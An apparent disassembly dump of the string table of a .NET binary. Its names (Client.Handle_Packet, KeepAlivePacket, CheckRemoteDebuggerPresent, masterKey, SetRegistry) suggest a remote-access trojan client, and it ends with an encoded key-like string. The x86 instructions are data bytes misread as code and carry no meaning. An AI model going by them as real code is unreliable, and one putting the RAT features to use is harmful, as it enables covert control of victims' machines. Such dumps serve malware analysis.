  409122:	6c                   	insb   (%dx),%es:(%edi)
  409123:	6f                   	outsl  %ds:(%esi),(%dx)
  409124:	61                   	popa
  409125:	74 00                	je     0x409127
  409127:	53                   	push   %ebx
  409128:	65 74 41             	gs je  0x40916c
  40912b:	73 46                	jae    0x409173
  40912d:	6c                   	insb   (%dx),%es:(%edi)
  40912e:	6f                   	outsl  %ds:(%esi),(%dx)
  40912f:	61                   	popa
  409130:	74 00                	je     0x409132
  409132:	46                   	inc    %esi
  409133:	69 6e 64 4f 62 6a 65 	imul   $0x656a624f,0x64(%esi),%ebp
  40913a:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  40913e:	61                   	popa
  40913f:	6e                   	outsb  %ds:(%esi),(%dx)
  409140:	61                   	popa
  409141:	67 65 6d             	gs insl (%dx),%es:(%di)
  409144:	65 6e                	outsb  %gs:(%esi),(%dx)
  409146:	74 42                	je     0x40918a
  409148:	61                   	popa
  409149:	73 65                	jae    0x4091b0
  40914b:	4f                   	dec    %edi
  40914c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40914f:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  409153:	6f                   	outsl  %ds:(%esi),(%dx)
  409154:	72 63                	jb     0x4091b9
  409156:	65 50                	gs push %eax
  409158:	61                   	popa
  409159:	74 68                	je     0x4091c3
  40915b:	4f                   	dec    %edi
  40915c:	62 6a 65             	bound  %ebp,0x65(%edx)
  40915f:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  409163:	6f                   	outsl  %ds:(%esi),(%dx)
  409164:	6c                   	insb   (%dx),%es:(%edi)
  409165:	6c                   	insb   (%dx),%es:(%edi)
  409166:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  40916b:	6f                   	outsl  %ds:(%esi),(%dx)
  40916c:	6e                   	outsb  %ds:(%esi),(%dx)
  40916d:	6e                   	outsb  %ds:(%esi),(%dx)
  40916e:	65 63 74 00 52       	arpl   %esi,%gs:0x52(%eax,%eax,1)
  409173:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  409177:	6e                   	outsb  %ds:(%esi),(%dx)
  409178:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40917d:	65 74 00             	gs je  0x409180
  409180:	53                   	push   %ebx
  409181:	79 73                	jns    0x4091f6
  409183:	74 65                	je     0x4091ea
  409185:	6d                   	insl   (%dx),%es:(%edi)
  409186:	2e 4e                	cs dec %esi
  409188:	65 74 00             	gs je  0x40918b
  40918b:	53                   	push   %ebx
  40918c:	65 74 00             	gs je  0x40918f
  40918f:	54                   	push   %esp
  409190:	61                   	popa
  409191:	72 67                	jb     0x4091fa
  409193:	65 74 00             	gs je  0x409196
  409196:	43                   	inc    %ebx
  409197:	6c                   	insb   (%dx),%es:(%edi)
  409198:	69 65 6e 74 2e 48 61 	imul   $0x61482e74,0x6e(%ebp),%esp
  40919f:	6e                   	outsb  %ds:(%esi),(%dx)
  4091a0:	64 6c                	fs insb (%dx),%es:(%edi)
  4091a2:	65 5f                	gs pop %edi
  4091a4:	50                   	push   %eax
  4091a5:	61                   	popa
  4091a6:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4091a9:	74 00                	je     0x4091ab
  4091ab:	4b                   	dec    %ebx
  4091ac:	65 65 70 41          	gs gs jo 0x4091f1
  4091b0:	6c                   	insb   (%dx),%es:(%edi)
  4091b1:	69 76 65 50 61 63 6b 	imul   $0x6b636150,0x65(%esi),%esi
  4091b8:	65 74 00             	gs je  0x4091bb
  4091bb:	43                   	inc    %ebx
  4091bc:	6c                   	insb   (%dx),%es:(%edi)
  4091bd:	69 65 6e 74 53 6f 63 	imul   $0x636f5374,0x6e(%ebp),%esp
  4091c4:	6b 65 74 00          	imul   $0x0,0x74(%ebp),%esp
  4091c8:	53                   	push   %ebx
  4091c9:	79 73                	jns    0x40923e
  4091cb:	74 65                	je     0x409232
  4091cd:	6d                   	insl   (%dx),%es:(%edi)
  4091ce:	2e 43                	cs inc %ebx
  4091d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4091d1:	6c                   	insb   (%dx),%es:(%edi)
  4091d2:	6c                   	insb   (%dx),%es:(%edi)
  4091d3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4091d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4091d9:	73 2e                	jae    0x409209
  4091db:	49                   	dec    %ecx
  4091dc:	45                   	inc    %ebp
  4091dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4091de:	75 6d                	jne    0x40924d
  4091e0:	65 72 61             	gs jb  0x409244
  4091e3:	74 6f                	je     0x409254
  4091e5:	72 2e                	jb     0x409215
  4091e7:	52                   	push   %edx
  4091e8:	65 73 65             	gs jae 0x409250
  4091eb:	74 00                	je     0x4091ed
  4091ed:	67 65 74 5f          	addr16 gs je 0x409250
  4091f1:	4f                   	dec    %edi
  4091f2:	66 66 73 65          	data16 data16 jae 0x40925b
  4091f6:	74 00                	je     0x4091f8
  4091f8:	73 65                	jae    0x40925f
  4091fa:	74 5f                	je     0x40925b
  4091fc:	4f                   	dec    %edi
  4091fd:	66 66 73 65          	data16 data16 jae 0x409266
  409201:	74 00                	je     0x409203
  409203:	53                   	push   %ebx
  409204:	70 6c                	jo     0x409272
  409206:	69 74 00 43 6c 69 65 	imul   $0x6e65696c,0x43(%eax,%eax,1),%esi
  40920d:	6e 
  40920e:	74 4f                	je     0x40925f
  409210:	6e                   	outsb  %ds:(%esi),(%dx)
  409211:	45                   	inc    %ebp
  409212:	78 69                	js     0x40927d
  409214:	74 00                	je     0x409216
  409216:	53                   	push   %ebx
  409217:	61                   	popa
  409218:	6c                   	insb   (%dx),%es:(%edi)
  409219:	74 00                	je     0x40921b
  40921b:	49                   	dec    %ecx
  40921c:	41                   	inc    %ecx
  40921d:	73 79                	jae    0x409298
  40921f:	6e                   	outsb  %ds:(%esi),(%dx)
  409220:	63 52 65             	arpl   %edx,0x65(%edx)
  409223:	73 75                	jae    0x40929a
  409225:	6c                   	insb   (%dx),%es:(%edi)
  409226:	74 00                	je     0x409228
  409228:	54                   	push   %esp
  409229:	6f                   	outsl  %ds:(%esi),(%dx)
  40922a:	55                   	push   %ebp
  40922b:	70 70                	jo     0x40929d
  40922d:	65 72 49             	gs jb  0x409279
  409230:	6e                   	outsb  %ds:(%esi),(%dx)
  409231:	76 61                	jbe    0x409294
  409233:	72 69                	jb     0x40929e
  409235:	61                   	popa
  409236:	6e                   	outsb  %ds:(%esi),(%dx)
  409237:	74 00                	je     0x409239
  409239:	57                   	push   %edi
  40923a:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  40923e:	69 65 6e 74 00 49 6e 	imul   $0x6e490074,0x6e(%ebp),%esp
  409245:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  40924c:	65 
  40924d:	43                   	inc    %ebx
  40924e:	6c                   	insb   (%dx),%es:(%edi)
  40924f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409256:	74 5f                	je     0x4092b7
  409258:	53                   	push   %ebx
  409259:	73 6c                	jae    0x4092c7
  40925b:	43                   	inc    %ebx
  40925c:	6c                   	insb   (%dx),%es:(%edi)
  40925d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409264:	74 5f                	je     0x4092c5
  409266:	53                   	push   %ebx
  409267:	73 6c                	jae    0x4092d5
  409269:	43                   	inc    %ebx
  40926a:	6c                   	insb   (%dx),%es:(%edi)
  40926b:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409272:	74 5f                	je     0x4092d3
  409274:	54                   	push   %esp
  409275:	63 70 43             	arpl   %esi,0x43(%eax)
  409278:	6c                   	insb   (%dx),%es:(%edi)
  409279:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409280:	74 5f                	je     0x4092e1
  409282:	54                   	push   %esp
  409283:	63 70 43             	arpl   %esi,0x43(%eax)
  409286:	6c                   	insb   (%dx),%es:(%edi)
  409287:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  40928e:	74 68                	je     0x4092f8
  409290:	65 6e                	outsb  %gs:(%esi),(%dx)
  409292:	74 69                	je     0x4092fd
  409294:	63 61 74             	arpl   %esp,0x74(%ecx)
  409297:	65 41                	gs inc %ecx
  409299:	73 43                	jae    0x4092de
  40929b:	6c                   	insb   (%dx),%es:(%edi)
  40929c:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  4092a3:	73 74                	jae    0x409319
  4092a5:	65 6d                	gs insl (%dx),%es:(%edi)
  4092a7:	2e 4d                	cs dec %ebp
  4092a9:	61                   	popa
  4092aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ab:	61                   	popa
  4092ac:	67 65 6d             	gs insl (%dx),%es:(%di)
  4092af:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092b1:	74 00                	je     0x4092b3
  4092b3:	45                   	inc    %ebp
  4092b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4092b5:	76 69                	jbe    0x409320
  4092b7:	72 6f                	jb     0x409328
  4092b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ba:	6d                   	insl   (%dx),%es:(%edi)
  4092bb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4092bd:	74 00                	je     0x4092bf
  4092bf:	70 61                	jo     0x409322
  4092c1:	72 65                	jb     0x409328
  4092c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4092c4:	74 00                	je     0x4092c6
  4092c6:	53                   	push   %ebx
  4092c7:	79 73                	jns    0x40933c
  4092c9:	74 65                	je     0x409330
  4092cb:	6d                   	insl   (%dx),%es:(%edi)
  4092cc:	2e 43                	cs inc %ebx
  4092ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4092cf:	6c                   	insb   (%dx),%es:(%edi)
  4092d0:	6c                   	insb   (%dx),%es:(%edi)
  4092d1:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4092d7:	73 2e                	jae    0x409307
  4092d9:	49                   	dec    %ecx
  4092da:	45                   	inc    %ebp
  4092db:	6e                   	outsb  %ds:(%esi),(%dx)
  4092dc:	75 6d                	jne    0x40934b
  4092de:	65 72 61             	gs jb  0x409342
  4092e1:	74 6f                	je     0x409352
  4092e3:	72 2e                	jb     0x409313
  4092e5:	43                   	inc    %ebx
  4092e6:	75 72                	jne    0x40935a
  4092e8:	72 65                	jb     0x40934f
  4092ea:	6e                   	outsb  %ds:(%esi),(%dx)
  4092eb:	74 00                	je     0x4092ed
  4092ed:	53                   	push   %ebx
  4092ee:	79 73                	jns    0x409363
  4092f0:	74 65                	je     0x409357
  4092f2:	6d                   	insl   (%dx),%es:(%edi)
  4092f3:	2e 43                	cs inc %ebx
  4092f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f6:	6c                   	insb   (%dx),%es:(%edi)
  4092f7:	6c                   	insb   (%dx),%es:(%edi)
  4092f8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4092fe:	73 2e                	jae    0x40932e
  409300:	49                   	dec    %ecx
  409301:	45                   	inc    %ebp
  409302:	6e                   	outsb  %ds:(%esi),(%dx)
  409303:	75 6d                	jne    0x409372
  409305:	65 72 61             	gs jb  0x409369
  409308:	74 6f                	je     0x409379
  40930a:	72 2e                	jb     0x40933a
  40930c:	67 65 74 5f          	addr16 gs je 0x40936f
  409310:	43                   	inc    %ebx
  409311:	75 72                	jne    0x409385
  409313:	72 65                	jb     0x40937a
  409315:	6e                   	outsb  %ds:(%esi),(%dx)
  409316:	74 00                	je     0x409318
  409318:	47                   	inc    %edi
  409319:	65 74 43             	gs je  0x40935f
  40931c:	75 72                	jne    0x409390
  40931e:	72 65                	jb     0x409385
  409320:	6e                   	outsb  %ds:(%esi),(%dx)
  409321:	74 00                	je     0x409323
  409323:	43                   	inc    %ebx
  409324:	68 65 63 6b 52       	push   $0x526b6365
  409329:	65 6d                	gs insl (%dx),%es:(%edi)
  40932b:	6f                   	outsl  %ds:(%esi),(%dx)
  40932c:	74 65                	je     0x409393
  40932e:	44                   	inc    %esp
  40932f:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409333:	67 65 72 50          	addr16 gs jb 0x409387
  409337:	72 65                	jb     0x40939e
  409339:	73 65                	jae    0x4093a0
  40933b:	6e                   	outsb  %ds:(%esi),(%dx)
  40933c:	74 00                	je     0x40933e
  40933e:	69 73 44 65 62 75 67 	imul   $0x67756265,0x44(%ebx),%esi
  409345:	67 65 72 50          	addr16 gs jb 0x409399
  409349:	72 65                	jb     0x4093b0
  40934b:	73 65                	jae    0x4093b2
  40934d:	6e                   	outsb  %ds:(%esi),(%dx)
  40934e:	74 00                	je     0x409350
  409350:	67 65 74 5f          	addr16 gs je 0x4093b3
  409354:	52                   	push   %edx
  409355:	65 6d                	gs insl (%dx),%es:(%edi)
  409357:	6f                   	outsl  %ds:(%esi),(%dx)
  409358:	74 65                	je     0x4093bf
  40935a:	45                   	inc    %ebp
  40935b:	6e                   	outsb  %ds:(%esi),(%dx)
  40935c:	64 50                	fs push %eax
  40935e:	6f                   	outsl  %ds:(%esi),(%dx)
  40935f:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409366:	5f                   	pop    %edi
  409367:	43                   	inc    %ebx
  409368:	6f                   	outsl  %ds:(%esi),(%dx)
  409369:	75 6e                	jne    0x4093d9
  40936b:	74 00                	je     0x40936d
  40936d:	67 65 74 5f          	addr16 gs je 0x4093d0
  409371:	50                   	push   %eax
  409372:	72 6f                	jb     0x4093e3
  409374:	63 65 73             	arpl   %esp,0x73(%ebp)
  409377:	73 6f                	jae    0x4093e8
  409379:	72 43                	jb     0x4093be
  40937b:	6f                   	outsl  %ds:(%esi),(%dx)
  40937c:	75 6e                	jne    0x4093ec
  40937e:	74 00                	je     0x409380
  409380:	63 6f 75             	arpl   %ebp,0x75(%edi)
  409383:	6e                   	outsb  %ds:(%esi),(%dx)
  409384:	74 00                	je     0x409386
  409386:	47                   	inc    %edi
  409387:	65 74 50             	gs je  0x4093da
  40938a:	61                   	popa
  40938b:	74 68                	je     0x4093f5
  40938d:	52                   	push   %edx
  40938e:	6f                   	outsl  %ds:(%esi),(%dx)
  40938f:	6f                   	outsl  %ds:(%esi),(%dx)
  409390:	74 00                	je     0x409392
  409392:	44                   	inc    %esp
  409393:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409397:	70 74                	jo     0x40940d
  409399:	00 45 6e             	add    %al,0x6e(%ebp)
  40939c:	63 72 79             	arpl   %esi,0x79(%edx)
  40939f:	70 74                	jo     0x409415
  4093a1:	00 50 61             	add    %dl,0x61(%eax)
  4093a4:	72 61                	jb     0x409407
  4093a6:	6d                   	insl   (%dx),%es:(%edi)
  4093a7:	65 74 65             	gs je  0x40940f
  4093aa:	72 69                	jb     0x409415
  4093ac:	7a 65                	jp     0x409413
  4093ae:	64 54                	fs push %esp
  4093b0:	68 72 65 61 64       	push   $0x64616572
  4093b5:	53                   	push   %ebx
  4093b6:	74 61                	je     0x409419
  4093b8:	72 74                	jb     0x40942e
  4093ba:	00 43 6f             	add    %al,0x6f(%ebx)
  4093bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4093be:	76 65                	jbe    0x409425
  4093c0:	72 74                	jb     0x409436
  4093c2:	00 46 61             	add    %al,0x61(%esi)
  4093c5:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  4093cc:	54 
  4093cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4093ce:	4c                   	dec    %esp
  4093cf:	69 73 74 00 69 6e 70 	imul   $0x706e6900,0x74(%ebx),%esi
  4093d6:	75 74                	jne    0x40944c
  4093d8:	00 53 79             	add    %dl,0x79(%ebx)
  4093db:	73 74                	jae    0x409451
  4093dd:	65 6d                	gs insl (%dx),%es:(%edi)
  4093df:	2e 43                	cs inc %ebx
  4093e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4093e2:	6c                   	insb   (%dx),%es:(%edi)
  4093e3:	6c                   	insb   (%dx),%es:(%edi)
  4093e4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4093e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ea:	73 2e                	jae    0x40941a
  4093ec:	49                   	dec    %ecx
  4093ed:	45                   	inc    %ebp
  4093ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4093ef:	75 6d                	jne    0x40945e
  4093f1:	65 72 61             	gs jb  0x409455
  4093f4:	74 6f                	je     0x409465
  4093f6:	72 2e                	jb     0x409426
  4093f8:	4d                   	dec    %ebp
  4093f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4093fa:	76 65                	jbe    0x409461
  4093fc:	4e                   	dec    %esi
  4093fd:	65 78 74             	gs js  0x409474
  409400:	00 53 79             	add    %dl,0x79(%ebx)
  409403:	73 74                	jae    0x409479
  409405:	65 6d                	gs insl (%dx),%es:(%edi)
  409407:	2e 54                	cs push %esp
  409409:	65 78 74             	gs js  0x409480
  40940c:	00 47 65             	add    %al,0x65(%edi)
  40940f:	74 57                	je     0x409468
  409411:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409418:	78 74                	js     0x40948e
  40941a:	00 74 65 78          	add    %dh,0x78(%ebp,%eiz,2)
  40941e:	74 00                	je     0x409420
  409420:	76 00                	jbe    0x409422
  409422:	47                   	inc    %edi
  409423:	65 74 46             	gs je  0x40946c
  409426:	6f                   	outsl  %ds:(%esi),(%dx)
  409427:	72 65                	jb     0x40948e
  409429:	67 72 6f             	addr16 jb 0x40949b
  40942c:	75 6e                	jne    0x40949c
  40942e:	64 57                	fs push %edi
  409430:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409437:	65 74 5f             	gs je  0x409499
  40943a:	43                   	inc    %ebx
  40943b:	72 65                	jb     0x4094a2
  40943d:	61                   	popa
  40943e:	74 65                	je     0x4094a5
  409440:	4e                   	dec    %esi
  409441:	6f                   	outsl  %ds:(%esi),(%dx)
  409442:	57                   	push   %edi
  409443:	69 6e 64 6f 77 00 69 	imul   $0x6900776f,0x64(%esi),%ebp
  40944a:	6e                   	outsb  %ds:(%esi),(%dx)
  40944b:	64 65 78 00          	fs gs js 0x40944f
  40944f:	43                   	inc    %ebx
  409450:	6c                   	insb   (%dx),%es:(%edi)
  409451:	6f                   	outsl  %ds:(%esi),(%dx)
  409452:	73 65                	jae    0x4094b9
  409454:	4d                   	dec    %ebp
  409455:	75 74                	jne    0x4094cb
  409457:	65 78 00             	gs js  0x40945a
  40945a:	43                   	inc    %ebx
  40945b:	72 65                	jb     0x4094c2
  40945d:	61                   	popa
  40945e:	74 65                	je     0x4094c5
  409460:	4d                   	dec    %ebp
  409461:	75 74                	jne    0x4094d7
  409463:	65 78 00             	gs js  0x409466
  409466:	44                   	inc    %esp
  409467:	65 6c                	gs insb (%dx),%es:(%edi)
  409469:	61                   	popa
  40946a:	79 00                	jns    0x40946c
  40946c:	57                   	push   %edi
  40946d:	69 72 74 65 41 72 72 	imul   $0x72724165,0x74(%edx),%esi
  409474:	61                   	popa
  409475:	79 00                	jns    0x409477
  409477:	49                   	dec    %ecx
  409478:	6e                   	outsb  %ds:(%esi),(%dx)
  409479:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409480:	65 
  409481:	41                   	inc    %ecx
  409482:	72 72                	jb     0x4094f6
  409484:	61                   	popa
  409485:	79 00                	jns    0x409487
  409487:	4d                   	dec    %ebp
  409488:	73 67                	jae    0x4094f1
  40948a:	50                   	push   %eax
  40948b:	61                   	popa
  40948c:	63 6b 41             	arpl   %ebp,0x41(%ebx)
  40948f:	72 72                	jb     0x409503
  409491:	61                   	popa
  409492:	79 00                	jns    0x409494
  409494:	54                   	push   %esp
  409495:	6f                   	outsl  %ds:(%esi),(%dx)
  409496:	41                   	inc    %ecx
  409497:	72 72                	jb     0x40950b
  409499:	61                   	popa
  40949a:	79 00                	jns    0x40949c
  40949c:	67 65 74 5f          	addr16 gs je 0x4094ff
  4094a0:	41                   	inc    %ecx
  4094a1:	73 41                	jae    0x4094e4
  4094a3:	72 72                	jb     0x409517
  4094a5:	61                   	popa
  4094a6:	79 00                	jns    0x4094a8
  4094a8:	72 65                	jb     0x40950f
  4094aa:	66 41                	inc    %cx
  4094ac:	73 41                	jae    0x4094ef
  4094ae:	72 72                	jb     0x409522
  4094b0:	61                   	popa
  4094b1:	79 00                	jns    0x4094b3
  4094b3:	67 65 74 5f          	addr16 gs je 0x409516
  4094b7:	4b                   	dec    %ebx
  4094b8:	65 79 00             	gs jns 0x4094bb
  4094bb:	73 65                	jae    0x409522
  4094bd:	74 5f                	je     0x40951e
  4094bf:	4b                   	dec    %ebx
  4094c0:	65 79 00             	gs jns 0x4094c3
  4094c3:	43                   	inc    %ebx
  4094c4:	72 65                	jb     0x40952b
  4094c6:	61                   	popa
  4094c7:	74 65                	je     0x40952e
  4094c9:	53                   	push   %ebx
  4094ca:	75 62                	jne    0x40952e
  4094cc:	4b                   	dec    %ebx
  4094cd:	65 79 00             	gs jns 0x4094d0
  4094d0:	44                   	inc    %esp
  4094d1:	65 6c                	gs insb (%dx),%es:(%edi)
  4094d3:	65 74 65             	gs je  0x40953b
  4094d6:	53                   	push   %ebx
  4094d7:	75 62                	jne    0x40953b
  4094d9:	4b                   	dec    %ebx
  4094da:	65 79 00             	gs jns 0x4094dd
  4094dd:	4f                   	dec    %edi
  4094de:	70 65                	jo     0x409545
  4094e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e1:	53                   	push   %ebx
  4094e2:	75 62                	jne    0x409546
  4094e4:	4b                   	dec    %ebx
  4094e5:	65 79 00             	gs jns 0x4094e8
  4094e8:	67 65 74 5f          	addr16 gs je 0x40954b
  4094ec:	50                   	push   %eax
  4094ed:	75 62                	jne    0x409551
  4094ef:	6c                   	insb   (%dx),%es:(%edi)
  4094f0:	69 63 4b 65 79 00 5f 	imul   $0x5f007965,0x4b(%ebx),%esp
  4094f7:	61                   	popa
  4094f8:	75 74                	jne    0x40956e
  4094fa:	68 4b 65 79 00       	push   $0x79654b
  4094ff:	6d                   	insl   (%dx),%es:(%edi)
  409500:	61                   	popa
  409501:	73 74                	jae    0x409577
  409503:	65 72 4b             	gs jb  0x409551
  409506:	65 79 00             	gs jns 0x409509
  409509:	52                   	push   %edx
  40950a:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409511:	4b 65 
  409513:	79 00                	jns    0x409515
  409515:	5f                   	pop    %edi
  409516:	6b 65 79 00          	imul   $0x0,0x79(%ebp),%esp
  40951a:	53                   	push   %ebx
  40951b:	79 73                	jns    0x409590
  40951d:	74 65                	je     0x409584
  40951f:	6d                   	insl   (%dx),%es:(%edi)
  409520:	2e 53                	cs push %ebx
  409522:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409526:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40952d:	70 
  40952e:	74 6f                	je     0x40959f
  409530:	67 72 61             	addr16 jb 0x409594
  409533:	70 68                	jo     0x40959d
  409535:	79 00                	jns    0x409537
  409537:	41                   	inc    %ecx
  409538:	73 73                	jae    0x4095ad
  40953a:	65 6d                	gs insl (%dx),%es:(%edi)
  40953c:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409540:	41                   	inc    %ecx
  409541:	64 64 72 65          	fs fs jb 0x4095aa
  409545:	73 73                	jae    0x4095ba
  409547:	46                   	inc    %esi
  409548:	61                   	popa
  409549:	6d                   	insl   (%dx),%es:(%edi)
  40954a:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409551:	63 
  409552:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409556:	79 00                	jns    0x409558
  409558:	57                   	push   %edi
  409559:	72 69                	jb     0x4095c4
  40955b:	74 65                	je     0x4095c2
  40955d:	42                   	inc    %edx
  40955e:	69 6e 61 72 79 00 54 	imul   $0x54007972,0x61(%esi),%ebp
  409565:	6f                   	outsl  %ds:(%esi),(%dx)
  409566:	42                   	inc    %edx
  409567:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  40956e:	65 74 5f             	gs je  0x4095d0
  409571:	53                   	push   %ebx
  409572:	79 73                	jns    0x4095e7
  409574:	74 65                	je     0x4095db
  409576:	6d                   	insl   (%dx),%es:(%edi)
  409577:	44                   	inc    %esp
  409578:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40957f:	79 00                	jns    0x409581
  409581:	53                   	push   %ebx
  409582:	65 74 52             	gs je  0x4095d7
  409585:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  40958c:	00 6f 
  40958e:	70 5f                	jo     0x4095ef
  409590:	45                   	inc    %ebp
  409591:	71 75                	jno    0x409608
  409593:	61                   	popa
  409594:	6c                   	insb   (%dx),%es:(%edi)
  409595:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  40959c:	49 
  40959d:	6e                   	outsb  %ds:(%esi),(%dx)
  40959e:	65 71 75             	gs jno 0x409616
  4095a1:	61                   	popa
  4095a2:	6c                   	insb   (%dx),%es:(%edi)
  4095a3:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  4095aa:	74 
  4095ab:	65 6d                	gs insl (%dx),%es:(%edi)
  4095ad:	2e 4e                	cs dec %esi
  4095af:	65 74 2e             	gs je  0x4095e0
  4095b2:	53                   	push   %ebx
  4095b3:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4095b7:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  4095be:	64 
  4095bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4095c0:	77 73                	ja     0x409635
  4095c2:	49                   	dec    %ecx
  4095c3:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  4095c6:	74 69                	je     0x409631
  4095c8:	74 79                	je     0x409643
  4095ca:	00 49 73             	add    %cl,0x73(%ecx)
  4095cd:	4e                   	dec    %esi
  4095ce:	75 6c                	jne    0x40963c
  4095d0:	6c                   	insb   (%dx),%es:(%edi)
  4095d1:	4f                   	dec    %edi
  4095d2:	72 45                	jb     0x409619
  4095d4:	6d                   	insl   (%dx),%es:(%edi)
  4095d5:	70 74                	jo     0x40964b
  4095d7:	79 00                	jns    0x4095d9
  4095d9:	00 00                	add    %al,(%eax)
  4095db:	00 00                	add    %al,(%eax)
  4095dd:	0d 53 00 48 00       	or     $0x480053,%eax
  4095e2:	41                   	inc    %ecx
  4095e3:	00 32                	add    %dh,(%edx)
  4095e5:	00 35 00 36 00 00    	add    %dh,0x3600
  4095eb:	80 b1 62 00 70 00 52 	xorb   $0x52,0x700062(%ecx)
  4095f2:	00 73 00             	add    %dh,0x0(%ebx)
  4095f5:	4c                   	dec    %esp
  4095f6:	00 50 00             	add    %dl,0x0(%eax)
  4095f9:	78 00                	js     0x4095fb
  4095fb:	33 00                	xor    (%eax),%eax
  4095fd:	55                   	push   %ebp
  4095fe:	00 47 00             	add    %al,0x0(%edi)
  409601:	34 00                	xor    $0x0,%al
  409603:	56                   	push   %esi
  409604:	00 43 00             	add    %al,0x0(%ebx)
  409607:	4e                   	dec    %esi
  409608:	00 73 00             	add    %dh,0x0(%ebx)
  40960b:	78 00                	js     0x40960d
  40960d:	51                   	push   %ecx
  40960e:	00 46 00             	add    %al,0x0(%esi)
  409611:	37                   	aaa
  409612:	00 50 00             	add    %dl,0x0(%eax)
  409615:	68 00 52 00 61       	push   $0x61005200
  40961a:	00 69 00             	add    %ch,0x0(%ecx)
  40961d:	38 00                	cmp    %al,(%eax)
  40961f:	45                   	inc    %ebp
  409620:	00 38                	add    %bh,(%eax)
  409622:	00 72 00             	add    %dh,0x0(%edx)
  409625:	53                   	push   %ebx
  409626:	00 32                	add    %dh,(%edx)
  409628:	00 31                	add    %dh,(%ecx)
  40962a:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40962e:	00 62 00             	add    %ah,0x0(%edx)
  409631:	61                   	popa
  409632:	00 6b 00             	add    %ch,0x0(%ebx)
  409635:	4c                   	dec    %esp
  409636:	00 34 00             	add    %dh,(%eax,%eax,1)
  409639:	6c                   	insb   (%dx),%es:(%edi)
  40963a:	00 75 00             	add    %dh,0x0(%ebp)
  40963d:	68 00 6d 00 73       	push   $0x73006d00
  409642:	00 71 00             	add    %dh,0x0(%ecx)
  409645:	5a                   	pop    %edx
  409646:	00 55 00             	add    %dl,0x0(%ebp)
  409649:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40964d:	59                   	pop    %ecx
  40964e:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  409652:	00 71 00             	add    %dh,0x0(%ecx)
  409655:	50                   	push   %eax
  409656:	00 38                	add    %bh,(%eax)
  409658:	00 5a 00             	add    %bl,0x0(%edx)
  40965b:	52                   	push   %edx
  40965c:	00 77 00             	add    %dh,0x0(%edi)
  40965f:	4a                   	dec    %edx
  409660:	00 2f                	add    %ch,(%edi)
